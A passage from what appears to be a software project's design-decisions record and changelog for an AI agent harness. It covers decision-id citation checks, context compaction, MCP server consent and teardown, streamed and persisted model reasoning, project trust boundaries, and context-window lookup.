plaintext `<password>` element, a Gradle `password "..."` and a `user:tok3n@host` URL all pass
`check_output_policy` unredacted — the credential conventions of the five file types just added to
the allowlist. Left for whoever takes unit 5, because the assignment-shaped pattern is wide enough
to match ordinary prose and it would apply to every tool result in the harness.

**#94's fuller ambition** — a `_DOC_EXTENSIONS`/`_DOC_FILENAMES` pair derived from the manifest
table itself. The two now agree by one calling the other, which is the property that was missing;
merging them would also merge a security boundary with a discovery heuristic.

## 35. The record's index — the decisions, and whether they can be found — BUILT

**Three findings, one defect, and it is the defect this project is most exposed to.** The whole
reason the harness can be audited for *"does the code still follow our design choices"* is that the
choices have stable ids. `AGENTS.md` says so: *"Section and D-numbers are stable and
cross-referenced everywhere."* Three issues had each filed one way that sentence was false:

| | filed as | measured on `3b99ac0` |
|---|---|---|
| **#16** (severity S2) | four decisions (S2, S3, E4, E6) live only in `DEVLOG` | **sixteen** — *all* of `S1–S4` and *all* of `E1–E12`, and the map never named `E` at all |
| **#17** (severity S2) | two prefixes carry two numbering schemes each | **`S` carries three**, and `AC` — which #17 never mentions — is section-scoped and was cited **unqualified 24 times in production**, where `AC6` alone meant three different criteria in three files |
| **#147** (severity S3) | the `C` family is cited as authority in six production files and defined nowhere | confirmed; and `C1`'s one lookupable definition answers a different question |
| **#91** item 2 (severity S3) | `effective_compaction` promises provenance it does not return | confirmed; #91's other three items were already fixed by earlier batches |

#147 is the one that set the shape: *"All three are the same defect at the level of the record's
index, which is the argument for **one mechanical check** over all of them rather than three prose
fixes."* Prose fixes are what drifted in the first place.

### Design Decisions Record — §35 (Y1–Y5)

| id | decision |
|---|---|
| **Y1** | **The `S` and `E` tables move into the record.** `AGENTS.md` says the ROADMAPs carry it, and the fix is to make that true rather than to qualify the sentence. `DEVLOG` keeps each heading with a one-line summary and a pointer, so its per-section narrative still says a decision was taken there |
| **Y2** | **The check quantifies over both sides — what the record defines and what the code cites.** Map-side alone would have found none of `AC`, `D0`, `P10` or `S12`, because those are cited in code and never claimed by the map |
| **Y3** | **Declare the namespaces; qualify the citations; renumber nothing.** #147's own argument — the ids are in six production files, so changing them costs more than defining them. #17's suggested `Q11/Q12/Q16` also collides with `DEVLOG`'s existing `Q1–Q7` |
| **Y4** | **#91 item 2 is a docstring correction and a promoted deferral, not a build.** Provenance means rewriting the merge, not adding a field, and D27's display surface does not exist |
| **Y5** | **The new family letter is `Y`, not `O`.** `O1` and `01` are one glyph apart in every monospace font these documents are read in, which is the batch's own failure mode. Free after this: `O` |

### The check, and why it is a grammar rather than a list

An id in a production comment or docstring must either **resolve in the record** or **say which
other namespace it belongs to**. Six namespaces share the `LETTER+NUMBER` shape:

| namespace | ids | written as |
|---|---|---|
| design decisions | ~200, twenty families | bare |
| pipeline gates | `D0`, `D1`, `D2` | `gate D0` |
| acceptance criteria | `AC1`… | `§21 AC6` — section-scoped |
| Rev. 1 open questions | `S11`, `S12`, `S16` | `Rev. 1 S12` |
| audit severities | `S1`–`S4` | `severity S1` |
| review findings / mutations | `F2`, `P10` | `review finding F2`, `mutation P10` |

A **qualifier grammar** rather than a list of blessed ids, because a list only covers the citations
that already exist. That is the property #148 identifies as separating this project's two guards
that worked — **D24** (a raise over every registered tool, covering a tool nobody has written) and
**J4** (a decoder parametrised over `SAFE_DEFAULTS`, covering a kind nobody has added) — from the
warning comments that did not. #148's recommendation, verbatim: *"when an instance number reaches
three, the next decision should name the domain the rule quantifies over."* Three is where #16,
#17 and #147 had got to.

`D1` and `D2` are the pair nothing can force: both a decision and a gate, so both resolve and the
check cannot tell which was meant. Written down rather than papered over.

### What the batch moved

```
                                                         before        after
decision families with no definition in the record       5             2   (AC and F, both
                                                                            declared namespaces)
  ids in them                                            27            10
ids the map claims that the record does not hold         4  (S1-S4)    0
families the record defines that the map does not name   1  (E)        0
ids cited in production prose that resolve to nothing    26 distinct   0
  citations                                              83            0
AC citations that name their section                     29 of 53      53 of 53
meanings the prefix S carries                            3             2
```

### Two things the pass changed about the check itself

**The definition scanner has to know three shapes.** The record writes a decision as a plain table
row (`| D1 | ... |`), a bolded table row (`| **U1** | ... |`), or a bolded lead with the dash
*inside* the bold (`**M1 — ...**`). A scanner that knows only the first reports the entire `M`
family — 21 ids — as undefined. This batch's own first census did exactly that, and the count was
wrong by 21 before anyone noticed. `test_the_definition_scanner_sees_every_shape_the_record_uses`
pins one id per shape by name.

**The `AC` qualifier is line-scoped, not adjacent.** `§23 (AC1)` and `§27 T2 / AC6` are already
unambiguous to a reader, so requiring the section immediately before the id would have meant
rewriting correct prose. What it does require is that the section appear *somewhere earlier on the
same line*, which `(D23, AC6)` did not.

### The mutation pass, and the survivor that mattered

**23 mutations, three survivors on the first run, all three in the check rather than in the
documents.** Final: **23 of 23 RED**, from a control green on the unit file and on the full suite.

| survivor | why nothing caught it |
|---|---|
| `citation-scan-looks-at-comments-only` | **The narrow-the-domain mutation.** A scan that reads less finds nothing wrong, and finding nothing wrong is exactly what passing looks like. Dropping the docstring branch left every check green while the place most citations live stopped being read |
| `citation-scan-skips-the-hyphen-guard` | The guard's stated reason had gone **stale underneath it** — written for `[a-zA-Z0-9]` in a regex literal, obsolete once the scan stopped reading code. Measured, it still changes two lines, both range citations, and the case it is really for is a range over a *sparse* family: `C1–C10` would report five decisions that never existed |
| `grammar-a-qualifier-may-sit-anywhere-on-the-line` | No test had the qualifying word earlier in the sentence but not adjacent to the id |

The first is the same shape as batch 14's two survivors and worth naming as a class: **a check
whose passing condition is "found nothing" cannot detect that it looked in fewer places.** The
answer is to pin the domain in both directions — a citation that must be seen, and a runtime string
that must not.

The check also caught **this batch's own omission** on its first run: slice 3 added the `C` family
to the record and did not add it to the map.

### Not qualified, deliberately

Two `D0` sites are the pipeline's **data**: the stage name in `events.py`'s tuple and in
`_stage("D0")`. The trace lines are keyed by them and
`test_pipeline_trace_contains_expected_lines_in_order` matches on the `D0:` prefix. Found by making
the change and reading the failure, which is also how the comments-vs-values boundary got drawn
rather than guessed.

### Verification

- **Windows: 2,145 passed / 18 skipped / 1 deselected.**
- **`python:3.11-slim`, the CI configuration: 2,161 passed / 2 skipped / 1 deselected**, run
  on the final tree before the branch went anywhere — the fifth
  batch to honour §31's correction. It matters here: the check walks the filesystem and reads
  mixed-EOL documents, and one of its two failing-before tests names paths.
- **The check demonstrated RED on the branch point**, not merely green after: **two of its seven
  tests fail on `3b99ac0`**, the citation one listing all 26 ids. The other five are
  self-contained pins on the check's own scanner and grammar, so they pass on either tree by
  design -- which is the point of them.
- **23 of 23 mutations RED.**

### Closed with this section

**Unit X5 (#148)** — its two findings are #146 (fixed earlier) and #147. **#16 and #17** belong to
the master tracker #15 rather than to a unit. **#91** closes with unit 11 still holding #89, #90
and #92.

---

## 36. Compaction's boundaries — the trigger, the notice, the pin, the summarizer's input — BUILT

Audit Pass 1 fix batch 16: **#43, #44 + #172, #45, #89, #90**, and the surviving items of **#92**.
One commit per work package on `fix/batch-16-compaction`; per-change tables in
`tests/BREAKING_CHANGES.md` §32.

### Design Decisions Record — §36 (Z1–Z8)

| id | decision |
|---|---|
| **Z1** | **#43's mode is DERIVED from what the thread is; an explicit value wins.** `research_pass`/`subagent` → M6's backstop wherever re-entered (json_retry, §20 reviewer, spawned children — by construction, not by a parameter each call site can forget: the D24/R13 failure shape). Chat → working_set. Unknown kinds fail toward chat. `/grill-me` stays working_set deliberately — it runs in the user's live chat thread (§18's locked decision), so routine compaction there is the feature, made visible rather than silent by Z5. `ConversationMemory.kind` exists now: a boundary bend recorded in its docstring — it REPORTS what storage stores, it never branches on it |
| **Z2** | **`compact()` returns an outcome dict, never None** (#44): folded / blocked / all-pinned / missing-agent / no-progress / reentrant / empty-summary. Reportability lives with the caller — standing conditions are said ONCE PER RUN, notice and WARNING under the same dedup list, because only the loop knows how often compact() is called. This kills #44's per-evaluation WARNING and names #89's silent all-pinned path in the same contract |
| **Z3** | **#45 is repair at the loader, refusal in the loop.** A bad agent-file `max_steps` is repaired to undeclared with a warning naming the original (a one-field typo must not cost the agent); `_run` raises a named ValueError for direct callers — no file to lose there, only a bug worth naming. **`MAX_ITERATIONS` is 50** (was 20): the clamp default IS this constant, and two answers to one question was not acceptable |
| **Z4** | **A pin is reversible AND bounded** (#89): symmetric model-callable `unpin(last_n)` (same gating posture as pin — D26's premise made true rather than aspirational), and pin REFUSES over `PIN_MAX_TRIGGER_FRACTION` (0.5) × trigger, stating request/cap/share — M15's rule in the tool direction: silently delivering less protection than asked is the worse failure. `pin_measurements()` in compaction.py owns the numbers |
| **Z5** | **#172's notices ride the response on every drained path.** One-shot turns carry `response.notices` on their completion message and render through the SAME branch streaming uses; `_translate` forwards pass-path compaction notices as trace lines (its old justification — "they reach the shell as WARNING records" — was false for successful compactions, which log INFO). §21's "no silent compaction" now has no exception anywhere |
| **Z6** | **M2 amended: chain is the default; rederive is the fidelity option.** Owner decision — rederive's whole-span input made every compaction the most expensive call of the turn on exactly the threads that trigger most. Both strategies fall back to chain when a span outgrows one call (#90 built at last, VERBOSE about the switch), and one that outgrows even chain truncates OLDEST material with the cut stated twice: in the instruction, and deterministically on the stored summary — never trusted from model compliance |
| **Z7** | **The summarizer's input budget is `_input_budget(model)`** = context window minus the pipeline backstop margin. The proxy-vs-window comparison crosses M10's usual line out of necessity and says so; the safe direction is structural — undershooting costs truncation, overshooting costs an oversized send |
| **Z8** | **#92 closes as tests, not fixes**: item 1 (the `[called: ...]` line), items 2–3 (`estimated_tokens` counts tool_calls; asserted as a computed relation so repr drift survives and a dropped term dies), items 5–6 via Z2's statuses and once-per-run guard. Item 4 was already stale — #88's fix shipped the test |

### Closed with this section

**#43, #44, #45, #89, #90, #92, #172** — all open unit-11/unit-4 findings plus the sibling filed
post-audit. **#136 remains open** (X2): Z2 makes its repeated-attempt path *addressable* (the
status is data now) but does not yet cache it.

---

## 37. MCP's edges — disclosure, SSE, teardown, catalogue — BUILT

Audit unit 7's six remaining findings: **#60, #61, #62, #63, #64, #65**, on
`fix/batch-17-mcp-unit`. One commit per work package; per-change tables in
`tests/BREAKING_CHANGES.md` §33.

### Design Decisions Record — §37 (F1–F8)

| id | decision |
|---|---|
| **F1** | **The acknowledgement discloses its security posture** (#60): `AUTO-APPROVED` line, `working directory`, `disabled` marker, env **key names only**, and header key names for the http/sse transports (owner follow-up — since M19 stopped discarding them, `Authorization` is where those servers' credentials actually ride). Values never reach the terminal. Display-only by construction: `entry_digest` hashes the raw entry, never the prompt text, so no wording change can re-ask anyone; F3's bump is the one deliberate re-consent |
| **F2** | **Verbose ack via `VENASTINE_MCP_ACK_FULL=1`**, read at call time: appends the entry verbatim for debugging/audits. An env var deliberately, not a `settings.json` key — settings.json's precedence lets project tier beat user tier, and repo content must not be able to style a consent screen |
| **F3** | **The known-servers store is versioned; v2 re-asks once.** v1 consents were given under a prompt that omitted `autoApprove`, so they were blind and do not survive the bump: a legacy store reads as unknown-everything, `remember_server` starts from an empty mapping when legacy (a sibling's answer must never convert an unasked server), and the first acknowledgement persists the store as v2 |
| **F4** | **The auto-approve notice is a WARNING, not INFO.** On the TUI path stderr is closed and TranscriptLogHandler forwards WARNING+, so at INFO this reached nothing but app.log — the shell where approval prompts are modals was the one never told some tools would not prompt. Fires every launch per auto-approved server, deliberately |
| **F5** | **SSE only by explicit `"type": "sse"`** (#62). `sse` left the streamable alias set: D4 promises SSE, SDK v2 ships `sse_client`, and aliasing it is how an SSE-only server got offered a streamable handshake it could not answer. A bare `url` keeps meaning streamable — that is what every pre-existing config assumed, and URL sniffing would be magic. The aliases (`http`, `https`, `streamable-http`, `streamablehttp`) are unchanged. An unsupported declared type still refuses with a named error (M7's fall-through stays pinned shut) |
| **F6** | **Teardown has ONE shared wall-clock budget** (#64): polite close, force-cancel and thread join share a single deadline instead of three sequential 15s waits (~45s worst case, paid by Ctrl+C too). Servers still alive at expiry are NAMED in a WARNING |
| **F7** | **`unregister_all` is wired into teardown** (#65): `teardown_mcp` calls it after `disconnect_all()`, so ARCHITECTURE.md's "disconnect handling" justification describes something that exists. Runtime `/mcp` management is recorded as a candidate future section, deliberately not built here |
| **F8** | **The tool catalogue is cached at connect** (#63): the manager keeps the `list_tools()` result it already gathered inside the per-server timeout window, and registration serves from it. MCP's one timeout-less bridge call disappears; a miss falls back to fetching |

### Closed with this section

**#60, #61, #62, #63, #64, #65** — unit 7's entire remaining findings list. M16 (the sharp
orphan-path test) was already pinned by batch 1; this batch pins the other six. **M19's
headers property is now asserted on BOTH HTTP transports**, since SSE is a second place to
discard an Authorization header.

## §38. Live output — progressive rendering and visible thinking

**Status: BUILT.** Two complaints from using the TUI, one shared cause and one deeper one.

**The transcript showed nothing until the turn ended.** Every layer below it already streamed:
`call_model_stream` yields `StreamToken(text_delta=…)` on all three provider branches, `_run()`
forwards them as `LoopEvent(token_delta=…)`, and `tui/app.py` handed each one to
`Transcript.stream_delta`. That method did `self._pending += delta` and nothing else, so text
reached the screen only when `flush_stream()` ran — at a tool call, a system line, or
`TurnFinished`. Its own docstring said so and had said so since §26: "a plain answer with no
tool calls shows nothing until the turn ends… this is not progressive rendering." A plain
answer is the common case, and a harness that looks frozen for the length of a reply is
indistinguishable from one that has hung.

`supports_stream_usage` is not implicated and is worth naming, because it is where the next
person looks: it gates D21's usage-or-raise check only, and deltas stream regardless of it.

**Thinking was never CAPTURED, let alone displayed.** Not a renderer gap. Anthropic iterated
`stream.text_stream`, which carries text deltas only, and then filtered `final_msg.content` to
`type == "text"`; the OpenAI-compatible branch read `delta.content` alone; Google read `p.text`
and never asked for thought summaries. Neither `StreamToken` nor `LoopEvent` had a field for
it. `config.DEFAULT_EFFORT` has been `"high"` since batch 25, so on the default provider every
turn was thinking and the only evidence of it anywhere in the product was the corner raven.

### Design Decisions Record — §38 (O1–O8)

| id | decision |
|---|---|
| **O1** | **Thinking is DISPLAY-ONLY.** It never joins `ModelResponse.text`, is never persisted, and is never sent back on the wire. Every branch's `ModelResponse` is byte-identical to what it produced before, so D20's persisted turn, M4's fold boundary and `_messages_for_provider`'s translation are all untouched, and the feature cannot regress a thread. It also sidesteps the question of whether a provider requires its own thinking blocks returned on the next turn — the harness does today exactly what it did yesterday |
| **O2** | **Which providers show thinking is a fact about the providers, and is documented rather than smoothed over.** It works on Anthropic and on OpenAI-compatible providers that stream reasoning (DeepSeek, Qwen, Z.AI, OpenRouter). It is silently absent on `OPENAI`, whose Chat Completions endpoint returns no reasoning text at all, and on `GOOGLE`. **Google's request is deliberately unchanged** (owner decision): thought summaries need `ThinkingConfig(include_thoughts=True)`, which the pinned `google-genai==1.0.0` can express, but setting it alters a verified provider's wire request and bills summaries the model produces either way. Effort — whether the model thinks — is not what this switch controls; it controls whether the API hands the thoughts back |
| **O3** | **Capture is three lines in `core/client.py` and no new abstraction.** Anthropic iterates the `MessageStream` instead of `stream.text_stream` (the two share one underlying iterator, so a caller gets one or the other, and only iteration carries thinking), matching on the SDK's synthetic `TextEvent`/`ThinkingEvent`. The OpenAI-compatible branch reads `reasoning_content` **or** `reasoning` off the delta — there is no standard name, and `ChoiceDelta` being `extra="allow"` is what makes either arrive. Both shapes are asserted against the REAL pinned SDKs in `tests/test_sdk_conformance.py`, per D22, because a rename here fails silently: `getattr` returns `None` and every stream looks like it carried nothing |
| **O4** | **`LoopEvent` gets an eighth field, and P1 is re-made rather than widened.** `thinking_delta` sits beside `token_delta`. P1 rejected putting §22's and §23's kinds here because those describe a ten-pass RUN and live for the run, so a flat bag would have accumulated ~15 optional fields whose valid combinations lived only in prose. A thinking delta describes one model call's progress and lives for a turn — `token_delta`'s family exactly, the case P1's rule was never about. `test_loop_event_did_not_grow_a_ninth_field` is the same guard, moved on by one, and it worked: it is what forced this decision to be argued instead of appearing in a diff. The rejected alternative was carrying thinking on `notice`, which is §21's compaction channel and is mirrored onto `ModelResponse` — it would have leaked reasoning into every drainer that reads notices |
| **O5** | **Thinking is excluded from `pass_activity`'s character total.** `_translate` needs no code change (a thinking delta has `token_delta = None`), and the exclusion keeps `chars` meaning one thing — output streamed so far — rather than quietly becoming two instruments, which is item 9's misreading in a new place. The cost is stated in `_translate`'s own "What is NOT translated" block: a pass that thinks for minutes before writing looks idle, which is the shape §26 built `pass_activity` to cure. Flippable there if a real run shows it |
| **O6** | **`tui.show_thinking` follows `tui.animations` exactly**: a `bool` in `_KNOWN_TUI`, defaulted to `True` inline in `VenastineApp.__init__`, with **no** `config.py` constant. `config.py` holds no TUI values and is plain-values-only, and inventing a default in the loader would make a user who never touched the key indistinguishable from one who set it False. `/thinking [on|off]` flips it for the session and persists nothing, matching `/effort` and `/model` and batch 36's rule that nothing writes to `settings.json` |
| **O7** | **The transcript computes its own line boundaries.** `RichLog` appends and cannot rewrite a drawn row, so a delta cannot simply be painted. A chunk is committed when it ends where a rendered row ends: everything through the last newline, and past that a tail longer than one row up to its last space. The second rule is what makes a single long paragraph stream rather than arrive whole, and it is why the wrap has to be ours — Rich would soft-wrap the row still being appended to. A ``` fence is held until it closes, checked against `_stream_text + chunk` rather than the whole buffer, because a block whose closing fence has no newline after it yet puts the last newline INSIDE the fence. Holding is what keeps §26's syntax highlighting: a fence rendered plain cannot be restyled when it closes. The rejected alternative was a live-region `Static` repainting per token, which is genuinely token-by-token and needs height capping, scroll coordination, and a second place answer text lives. **`_entries` still holds ONE entry per span, updated in place** — appending per chunk would split a copied answer across `as_text()`'s joins and draw a `venastine ›` label per fragment |
| **O8** | **Hidden thinking is a widget, not a transcript line.** An ellipsis that does not move is not an indicator, and `RichLog` cannot animate one, so `ThinkingIndicator` is a `Static` docked under the transcript — hidden until a span starts, `height: auto`, so it costs nothing when thinking is shown inline. It honours `tui.animations` (RavenPanel's rule) and its timer is created **paused**, resumed only while a span is live: a 0.4s tick against a hidden widget is the idle redraw loop `pause_animation` exists to avoid. Both forms end at the same moment, through one `_end_thinking()` that every non-thinking event calls, so a flipped setting cannot leave one of them running |

### Verified by rendering, not by assertion

Two layout divergences survived a green suite and were found by rendering the
same text through both paths and diffing the rows: a wrap width guessed from
`content_size` rather than reproducing RichLog's own
`max(scrollable_content_region.width, min_width)`, and Rich's rendering of a
trailing newline as an extra empty row (at the end of an answer, and on both
sides of every fence, where the newline terminating the ``` line is structural
rather than spacing). Both are fixed at the producer, in the `_render_blocks`
both paths already shared, and the diff itself is now
`test_live_output.py::TestAStreamedAnswerRendersLikeAWrittenOne`.

The invariant it pins is worth stating on its own: **a streamed answer and the
same answer written whole must produce identical rows.** `rerender()` replays
`_entries` through the whole-text path, so a divergence means a `/theme`
reflows a transcript it was only meant to recolour -- and it is invisible to
every assertion that reads `_entries` instead of the screen, which is §27's
own recorded lesson.

### Deliberately not in §38

- **The CLI.** `main.py`'s `run_chat` drains `run_agent_conversation` and prints the finished
  answer, and still does. D12 keeps the CLI a permanent fallback rather than a second front
  end, and the capture in `core/client.py` is where a later CLI change would start from.
- **Persisting thinking**, for O1's reason.
- **`include_thoughts` on Google**, for O2's.

### Closed with this section

The two complaints above. `Transcript`'s docstring is the artifact worth noting: it described
this defect accurately for two sections before anyone read it as a bug report.

---

## §44. The provider it is on, the reasoning it kept, and the project it is in

**Status: BUILT.** Four defects reported from use after §41 and §43, and two more found while
verifying them. Every one is a seam between two features that were each correct on their own.

**The launch warning named a provider the session would never call.** #138 computes the provider
check in `main()`, from `resolve_runtime_defaults`' pair, and freezes the findings into a list the
TUI renders at mount. §43 then taught the app to restore a remembered `/model` pair — inside
`VenastineApp.__init__`, long after `main()` built that list. So a session came up with a banner
reading `OPENROUTER | minimax-m3 (remembered)` and, one row beneath it, a warning that ANTHROPIC
has no API key. With only OPENROUTER configured it announced `Unknown provider: ANTHROPIC` and
then ran perfectly well. Both features were tested; neither test built the other's state.

**Reasoning did not survive a restart — and had never reached the model at all.** §38's O1 made
thinking display-only: captured, streamed to the widget, dropped. Reopening a thread therefore
showed the answers with the reasoning silently gone, which is what was reported. The larger half
was not reported because it is invisible: the harness has never echoed reasoning back, not across
a restart and not between two turns of one live session, so every turn re-derives what the turn
before it already worked out, from the user's words rather than from its own recent working.

**And §38 rendered nothing at all on Anthropic.** Found while verifying the above.
`_thinking_for_provider` sent `{"type": "adaptive"}` and took the default `display`, which on
Fable 5, Opus 5, Opus 4.8/4.7 and Sonnet 5 is `"omitted"` — thinking blocks still stream, with
EMPTY text. `ev.thinking` was `""`, `core/loop.py`'s truthiness guard never fired, and neither the
inline block nor `ThinkingIndicator` ever appeared. The feature looked healthy because the
OpenAI-compatible branch reads `reasoning_content` and is unaffected, and that is the branch it was
being used on.

**`/init` scaffolded the harness's own repository.** With `AGENT_WORKSPACE` set, `read`/`write`/
`edit`/`shell` were correctly confined to the project while `/init` wrote its documentation set
into the harness — one session with two ideas of where the work was. RM6 recorded that split
deliberately (trust keys off cwd; `AGENT_WORKSPACE` is a permission boundary "deliberately not a
project path"), and this is what it looks like in use.

**`ctx N/40k` was asked about, and the answer did not survive contact.** The denominator is the
compaction trigger, and it is ABSOLUTE: 40k on a 200k model and on a 1M one alike, so a 1M-window
thread folded at 4% of its window — a model call spent and fidelity lost against a problem the
model did not have. M1 chose that, and M1's argument was arithmetic about `MAX_TOKEN_BUDGET`, then
a default spend ceiling of 250k. **Batch 27 deleted that ceiling.** The premise went and the
constant stayed.

**The window query 404s on exactly the providers that publish a window.** Reported mid-discussion
and verified: `context_window_for` called `client.models.retrieve(model)` alone — `GET
{base}/models/{id}` — and OpenRouter implements the listing plus
`/models/:author/:slug/endpoints` and no plain per-id route, so an id containing a slash addressed
something that does not exist. NVIDIA has the same shape. The READER was never wrong:
`context_length` has been in `_WINDOW_FIELD_ALIASES` since batch 30 and its own comment names
OpenRouter as reporting it. The one provider the comment named as answering was the one that
always failed.

### What this section amends

Six locked decisions are reversed or narrowed here. Each is argued in the record below rather than
quietly overwritten, because this project's convention on finding no record is to re-derive — so a
decision that changed without its reasoning changing with it is one that gets changed back.

| id | was | becomes |
|---|---|---|
| **O1** | thinking is never persisted and never on the wire | persisted as the provider's own blocks, and echoed back to the model that produced them (WS3, WS4) |
| **M1** | the trigger is an absolute working-set target | a share of `context_limit()`; M1's premise no longer exists (WS5) |
| **RM6** | trust keys off cwd; `AGENT_WORKSPACE` is a permission boundary only | an explicit `AGENT_WORKSPACE` **is** the project path (WS7) |
| **I9** | `CONTEXT.md` is the hub, and the only document in `.venastine/` | root `AGENTS.md` is the hub; `.venastine/` is configuration only (WS8) |
| **D17** | the trust hash covers `.venastine/` | plus the root `AGENTS.md`, because that is what now reaches the system prompt (WS9) |
| §31 `/window` | ephemeral, cleared by `/model` | remembered per `(provider, model)`, outranking the query and the table (WS6) |

### Design Decisions Record — §44 (WS1–WS10)

| id | decision |
|---|---|
| **WS1** | **The launch provider check is computed where the resolved pair is known, and nowhere else.** `credentials.provider_startup_issues()` was always right; its INPUT was wrong, so the fix is at the producer: the call moves into `VenastineApp.__init__`, immediately after `_startup_model()` has restored any remembered pair. `main()` keeps it for the CLI, where nothing restores anything, and the `startup_warnings` parameter is REMOVED from `VenastineApp.__init__` and `tui.app.run` rather than left defaulting — a parameter whose whole capability is carrying a stale finding is what this defect was. The rejected alternative was recomputing at mount from the app's pair while still accepting the list, which leaves both paths alive and the next reader unsure which one speaks |
| **WS2** | **`credentials.missing_key_message()` is one wording, used at launch and at `/model`.** The two sites had drifted — one naming `LLM_PROVIDERS_FILE`, the other the literal `providers.json` — while `tui/app.py`'s comment beside the launch render already claimed they were "the same fact at both moments". No new mechanism; the sentence has one home now, like `no_providers_message()` beside it |
| **WS3** | **Thinking is persisted as the PROVIDER'S BLOCKS, not as the streamed prose, and in its own column.** An Anthropic thinking block carries a `signature` the model verifies against its own state, so a record rebuilt from the display deltas would be unsigned and useless for WS4; the blocks come off `get_final_message()`, which already had them. A nullable `MessageLog.thinking` rather than a key inside `content`, because these are different kinds of thing with different rules — `content` is what the model said, this is signed provider state — and because everything that MEASURES the conversation (the compactor's input, `/summary`) must be able to leave it out without parsing around it. `_to_neutral` adds the key only when a row carried reasoning, so every message written before this batch reconstructs to exactly the shape it always did. `redacted_thinking` is stored and never rendered: opaque to us, meaningful to the model |
| **WS4** | **Reasoning goes back on the wire, gated on the `(provider, model)` PAIR.** The record names what produced it and the blocks return unchanged to that model and to nothing else — after a `/model` switch the thread is full of blocks the new model never wrote and cannot verify. Dropping is always safe, because dropping is exactly what the harness did before this batch, which is also what a pre-§44 message gets. Anthropic's blocks lead the assistant content array, because that is the order they were emitted in and a signed block placed after the text it preceded is a different message. The OpenAI-compatible side is OPT-IN per provider (`echoes_reasoning` in `providers.json`, `supports_stream_usage`'s precedent): receiving reasoning there is a convention, sending it back is not one — DeepSeek documents that `reasoning_content` must not be supplied on input and returns a 400, while OpenRouter accepts it for some models and ignores it for others. Google is unchanged; O2 never asks it for thought summaries, so it has none of its own to return |
| **WS5** | **The working-set trigger is `COMPACTION_TRIGGER_FRACTION × context_limit()`, and a FRACTION rather than `window − margin`.** M1's reasoning has expired: it rejected a window-derived trigger because one "sits at a size the thread can never reach in working order", and the arithmetic behind that was a default `MAX_TOKEN_BUDGET` of 250k that batch 27 deleted. The margin shape — which is what the research backstop uses — cannot be right at both ends of the roster: 40k below 1M is a rounding error and 40k below 64k leaves 24k, which is not a working thread. A share scales by construction. The derived value is a DEFAULT and sits LAST: an explicit `/compact` override, a session `/trigger`, and `settings.json`'s `compaction.trigger_tokens` all outrank it, so this changes a default rather than removing a control, and it arrives through D27's existing per-invocation slot rather than as a fifth tier. `COMPACTION_TRIGGER_TOKENS` survives as the trigger for the one caller with no model in scope — `pin_measurements` — so #89's pin cap is byte-for-byte what it was and one `pin` cannot freeze 425k of a 1M thread. The warning margin and keep-recent floor stay ABSOLUTE, because both buy an amount of CONVERSATION and a turn does not get bigger because the window did |
| **WS6** | **A context window is a FACT ABOUT A DEPLOYMENT, so it is remembered rather than re-entered.** §31 made `/window` a one-slot ephemeral override cleared by `/model`; that is the right lifetime for `/trigger`, which is a knob for a thread behaving badly, and the wrong one for this. `core/model_windows.py` is a user-tier store keyed on EVERY `(provider, model)` answered for, and it OUTRANKS both the live query and `MODEL_CONTEXT_WINDOWS`. That precedence is an inversion worth stating: everywhere else here a measured value beats a configured one because tables go stale, but a query can be confidently wrong — a gateway reporting its own default rather than the deployment's — while a number someone typed is a statement about what they are actually running. Its own module and file rather than `tui/preferences.py`, because `core/compaction.py` reads it and D12 forbids core importing the shell; and not `core/session.py`, whose contract is that nothing there reaches disk. Keeping an ephemeral tier ABOVE the store was the rejected alternative: `/model` would clear a value the store immediately re-supplied, so "override cleared" would be true and change nothing |
| **WS7** | **An explicit `AGENT_WORKSPACE` is the project path.** RM6 is reversed: the point of pointing the harness at a directory is that it operates on that directory, and a permission boundary the rest of the harness disagrees with is not a boundary but a disagreement. One line in `main()` moves, and everything follows because `config_loader.get_project_path()` is the single resolver — `/init`'s destination in BOTH places it is resolved (`generator.generate` and, decisively, `write_project_doc`'s own `_project_root`, which I1 gave no path parameter precisely so it could not be aimed), D17 trust, the `.venastine/` tier, and `UserMemory`'s project scope. PRESENCE, never value: `AGENT_WORKSPACE` defaults to `./workspace`, a subdirectory of the launch directory, so a value test would quietly move the project one level down for everyone who has never set anything. Safe by an ordering that already existed — `protected_paths.check_workspace()` refuses a workspace inside the harness tree several lines earlier, which is now load-bearing for a second reason. `AGENT_OUTPUT_DIR` follows, because "artifacts are local" is only true if local tracks where the work is; `app.db` and the log stay global, since one database per workspace would re-introduce the accidental scoping axis `UserMemory.project_path` exists to avoid. Project-scoped memories re-scope silently, which is what happens whenever anyone switches projects |
| **WS8** | **The hub is a root `AGENTS.md`, and `.venastine/` holds configuration only.** I9's location is reversed for two reasons that pull the same way. A project shared WITHOUT `.venastine/` — the ordinary thing to do when you do not want to ship your configuration — arrived as a set of root documents pointing at a hub that was not in the archive. And `AGENTS.md` is the filename other harnesses already look for, so an initialized project is legible to them without a second copy of the same content under a second name — which is the failure this repository records about itself in the first paragraph of its own `AGENTS.md`. `CONTEXT.md` is removed outright rather than kept as a fallback: a fallback is a second path that must keep agreeing with the first, and re-running `/init` is one command. `doc_path()` loses its branch and becomes one join; the index links become siblings |
| **WS9** | **The trust boundary moves with the file, and the two traversals become one.** `.venastine/` is gated because its content becomes system-prompt text, so a root `AGENTS.md` reaching the same place with no grant would be D17's own stated threat arriving through the door WS8 opens. `workspace_trust.content_files()` lists it, and its paths become PROJECT-relative — `AGENTS.md` and `.venastine/AGENTS.md` are different files and a listing that cannot tell them apart is not one anybody can act on. Every existing grant re-prompts once, correctly, because the set being consented to changed. `is_trusted()` asks the LISTING whether there is anything to trust rather than asking whether the directory exists, so a repo with an `AGENTS.md` and no `.venastine/` now prompts. The trust prompt SHOWS the file, previewed rather than pasted: it is the plainest instance of that prompt's own criterion, and `settings.json` and `mcp.json` were already shown while saying less. And `_content_hash()` now iterates `content_files()` instead of walking a second time — closing the item AGENTS.md lists as still open, since two traversals that must agree by construction is exactly how #18 drifted |
| **WS10** | **The window query falls back to the LISTING, and a model absent from a complete one is an ANSWER.** `models.retrieve` stays first: it is one call and it is right for Groq, Together and Mistral, while a listing can be hundreds of entries. On failure `client.models.list()` is tried once per provider and matched by `id`, with the same alias sniff plus OpenRouter's nested `top_provider.context_length`. A complete listing that does not name the model has told us this provider has nothing to say about it, so it is cached rather than retried — #35's cap exists to stop exactly that kind of repetition. A listing that itself fails reports the RETRIEVE error, because the listing is not a second opinion but the same question by another route, and naming the fallback's endpoint would hide the one the user configured. `MODEL_CONTEXT_WINDOWS`' values were right and its COMMENT was stale — the `context-1m-2025-08-07` gate it described was a Sonnet 4-era fact and never applied to the models listed — which is the dangerous combination once WS5 makes the table decide when every thread folds |

### Deliberately not in §44

